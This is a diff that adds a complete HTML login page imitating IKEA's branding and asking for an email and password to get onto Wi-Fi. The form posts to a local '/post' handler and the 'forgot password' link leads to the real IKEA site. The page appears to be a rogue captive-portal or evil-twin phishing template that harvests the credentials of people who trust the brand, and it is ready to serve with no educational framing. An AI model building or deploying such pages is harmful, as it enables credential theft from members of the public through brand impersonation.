@@ -1,0 +1,138 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>IKEA Wi-Fi Login</title>
+<style>
+    /* Global Styles */
+    body {
+        margin: 0;
+        font-family: 'Arial', Helvetica, sans-serif;
+        background-color: #ffcc00; /* IKEA Yellow */
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        height: 100vh;
+    }
+
+    /* Card Container */
+    .login-card {
+        background: #ffffff;
+        padding: 50px 40px;
+        border-radius: 20px;
+        box-shadow: 0 12px 35px rgba(0,0,0,0.2);
+        width: 90%;
+        max-width: 400px;
+        text-align: center;
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+    }
+
+    /* Header Styles */
+    .login-card h1 {
+        color: #0058a3; /* IKEA Blue */
+        font-size: 48px;
+        font-weight: 900;
+        margin-bottom: 15px;
+        letter-spacing: 2px;
+    }
+
+    .login-card h2 {
+        color: #0058a3;
+        font-size: 20px;
+        margin-bottom: 35px;
+        font-weight: bold;
+    }
+
+    /* Form Styles */
+    form {
+        width: 100%;
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+    }
+
+    .inputBox {
+        width: 100%;
+        padding: 15px 18px;
+        margin-bottom: 20px;
+        border: 1px solid #d1d1d1;
+        border-radius: 10px;
+        font-size: 18px;
+        font-weight: 500;
+        outline: none;
+        transition: all 0.2s ease-in-out;
+    }
+
+    .inputBox:focus {
+        border-color: #0058a3;
+        box-shadow: 0 0 8px rgba(0,88,163,0.5);
+    }
+
+    /* Button Styles */
+    button {
+        width: 100%;
+        padding: 15px;
+        background-color: #0058a3; /* IKEA Blue */
+        color: #ffffff;
+        font-weight: 700;
+        font-size: 18px;
+        border: none;
+        border-radius: 10px;
+        cursor: pointer;
+        transition: background 0.2s ease-in-out;
+    }
+
+    button:hover {
+        background-color: #003f7f;
+    }
+
+    /* Forgot Password Link */
+    a {
+        margin-top: 20px;
+        color: #0058a3;
+        text-decoration: none;
+        font-size: 16px;
+        font-weight: bold;
+        text-align: center;
+    }
+
+    a:hover {
+        text-decoration: underline;
+    }
+
+    /* Responsive Adjustments */
+    @media (max-width: 500px) {
+        .login-card {
+            padding: 40px 25px;
+        }
+        .login-card h1 {
+            font-size: 36px;
+        }
+        .login-card h2 {
+            font-size: 18px;
+        }
+        .inputBox, button {
+            font-size: 16px;
+            padding: 12px 15px;
+        }
+    }
+</style>
+</head>
+<body>
+
+<div class="login-card">
+    <h1>IKEA</h1>
+    <h2>Login to access Wi-Fi</h2>
+    <form action="/post" id="login-form">
+        <input class="inputBox" name="email" id="email" type="text" placeholder="Email">
+        <input class="inputBox" name="password" id="password" type="password" placeholder="Password">
+        <button type="submit">Log In</button>
+    </form>
+    <a href="https://www.ikea.com" target="_blank" rel="noopener noreferrer">Forgot your password?</a>
+</div>
+
+</body>
+</html>
